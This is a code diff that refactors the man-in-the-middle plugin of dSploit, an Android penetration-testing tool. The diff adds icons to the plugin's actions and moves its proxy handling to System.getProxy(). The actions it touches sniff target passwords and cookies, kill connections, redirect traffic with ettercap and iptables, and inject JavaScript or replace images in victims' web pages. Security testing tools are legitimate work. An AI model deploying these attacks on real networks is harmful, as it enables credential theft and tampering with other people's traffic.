@@ -30,6 +30,7 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
 import android.widget.ArrayAdapter;
+import android.widget.ImageView;
 import android.widget.ListView;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -44,7 +45,6 @@ import it.evilsocket.dsploit.gui.dialogs.FatalDialog;
 import it.evilsocket.dsploit.gui.dialogs.InputDialog;
 import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
 import it.evilsocket.dsploit.net.Target;
-import it.evilsocket.dsploit.net.http.Proxy;
 
 public class MITM extends Plugin 
 {
@@ -53,19 +53,23 @@ public class MITM extends Plugin
 	private ListView      	  mActionListView = null;
 	private ActionAdapter 	  mActionAdapter  = null;
 	private ArrayList<Action> mActions  	  = new ArrayList<Action>();	
-	private Proxy			  mProxy		  = null;
 	
-	class Action
+	static class Action
 	{
+		public int			   resourceId;
 		public String 		   name;
 		public String 		   description;
 		public OnClickListener listener;
 		
-		public Action( String name, String description, OnClickListener listener )
-		{
+		public Action( String name, String description, int resourceId, OnClickListener listener ) {
+			this.resourceId  = resourceId;
 			this.name 		 = name;
 			this.description = description;
 			this.listener 	 = listener;
+		}
+		
+		public Action( String name, String description, OnClickListener listener ) {
+			this( name, description, R.drawable.action_plugin_48, listener );
 		}
 	}
 	
@@ -76,6 +80,7 @@ public class MITM extends Plugin
 		
 		public class ActionHolder
 		{		
+			ImageView   icon;
 			TextView    name;
 			TextView    description;
 			ProgressBar activity;
@@ -100,6 +105,7 @@ public class MITM extends Plugin
 	            
 	            holder = new ActionHolder();
 	            
+	            holder.icon		   = ( ImageView )row.findViewById( R.id.actionIcon );
 	            holder.name        = ( TextView )row.findViewById( R.id.itemName );
 	            holder.description = ( TextView )row.findViewById( R.id.itemDescription );
 	            holder.activity    = ( ProgressBar )row.findViewById( R.id.itemActivity );
@@ -113,6 +119,7 @@ public class MITM extends Plugin
 	        
 	        Action action = mActions.get( position );
 
+	        holder.icon.setImageResource( action.resourceId );
 	        holder.name.setText( action.name );
 	        holder.description.setText( action.description );
 	        
@@ -160,7 +167,7 @@ public class MITM extends Plugin
 			
 			System.getEttercap().kill();
 			System.getIPTables().undoPortRedirect( 80, 8080 );
-			mProxy.stop();
+			System.getProxy().stop();
 			
 			for( i = 0; i < rows; i++ )
 			{
@@ -179,17 +186,15 @@ public class MITM extends Plugin
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);   
         
-        try
-        {
-			mProxy = new Proxy( System.getNetwork().getLoacalAddress(), 8080 );
-        }
-        catch( Exception e )
-        {
-        	Log.e( TAG, e.toString() );
+        if( System.getProxy() == null )
         	new FatalDialog( "Error", "Could not create proxy instance.", MITM.this ).show();
-        }
-        
-        mActions.add( new Action( "Simple Sniff", "Only redirect target's traffic through this device, useful when using a network sniffer like 'Sharp' for android.", new OnClickListener(){
+
+        mActions.add( new Action
+        ( 
+        	"Simple Sniff", 
+        	"Only redirect target's traffic through this device, useful when using a network sniffer like 'Sharp' for android.", 
+        	R.drawable.action_sniffer_48,
+        	new OnClickListener(){
 			@Override
 			public void onClick( View v ) 
 			{
@@ -207,7 +212,12 @@ public class MITM extends Plugin
 			}
 		}));
         
-        mActions.add( new Action( "Kill Connections", "Kill connections preventing everyone to reach any website or server.", new OnClickListener(){
+        mActions.add( new Action
+        ( 
+        	"Kill Connections", 
+        	"Kill connections preventing everyone to reach any website or server.",
+        	R.drawable.action_kill_48,
+        	new OnClickListener(){
 			@Override
 			public void onClick(View v) {
 				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
@@ -232,7 +242,12 @@ public class MITM extends Plugin
 			}
 		}));
         
-        mActions.add( new Action( "Password & Cookies", "Sniff cookies, http, ftp and web passwords from the target.", new OnClickListener(){
+        mActions.add( new Action
+        ( 
+        	"Password & Cookies", 
+        	"Sniff cookies, http, ftp and web passwords from the target.",
+        	R.drawable.action_passwords_48,
+        	new OnClickListener(){
         	@Override
 			public void onClick( View v ) 
 			{
@@ -250,7 +265,12 @@ public class MITM extends Plugin
 			}
 		}));
 
-        mActions.add( new Action( "Replace Images", "Replace all images on webpages with the specified one.", new OnClickListener(){
+        mActions.add( new Action
+        (
+        	"Replace Images", 
+        	"Replace all images on webpages with the specified one.", 
+        	R.drawable.action_image_48,
+        	new OnClickListener(){
 			@Override
 			public void onClick(View v) {
 				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
@@ -270,7 +290,7 @@ public class MITM extends Plugin
 								
 								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 
-								HTTPFilter.start( mProxy, "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + url + "\"" );
+								HTTPFilter.start( System.getProxy(), "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + url + "\"" );
 							}
 							else
 								new ErrorDialog( "Error", "Invalid image url.", MITM.this ).show();
@@ -279,14 +299,19 @@ public class MITM extends Plugin
 				}
 				else
 				{					
-					HTTPFilter.stop( mProxy );
+					HTTPFilter.stop( System.getProxy() );
 
 					activity.setVisibility( View.INVISIBLE );
 				}
 			}
 		}));
 
-        mActions.add( new Action( "Script Injection", "Inject a javascript in every visited webpage.", new OnClickListener(){
+        mActions.add( new Action
+        ( 
+        	"Script Injection", 
+        	"Inject a javascript in every visited webpage.",
+        	R.drawable.action_injection_48,
+        	new OnClickListener(){
 			@Override
 			public void onClick(View v) {
 				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
@@ -314,7 +339,7 @@ public class MITM extends Plugin
 								
 								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 												
-								HTTPFilter.start( mProxy, "(?i)</head>", js + "</head>" );								
+								HTTPFilter.start( System.getProxy(), "(?i)</head>", js + "</head>" );								
 							}
 							else
 								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
@@ -323,7 +348,7 @@ public class MITM extends Plugin
 				}
 				else
 				{					
-					HTTPFilter.stop( mProxy );
+					HTTPFilter.stop( System.getProxy() );
 
 					activity.setVisibility( View.INVISIBLE );
 				}
@@ -351,7 +376,7 @@ public class MITM extends Plugin
 								
 								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 												
-								HTTPFilter.start( mProxy, from, to );				
+								HTTPFilter.start( System.getProxy(), from, to );				
 							}
 							else
 								new ErrorDialog( "Error", "Invalid from expression.", MITM.this ).show();
@@ -360,7 +385,7 @@ public class MITM extends Plugin
 				}
 				else
 				{
-					HTTPFilter.stop( mProxy );
+					HTTPFilter.stop( System.getProxy() );
 
 					activity.setVisibility( View.INVISIBLE );
 
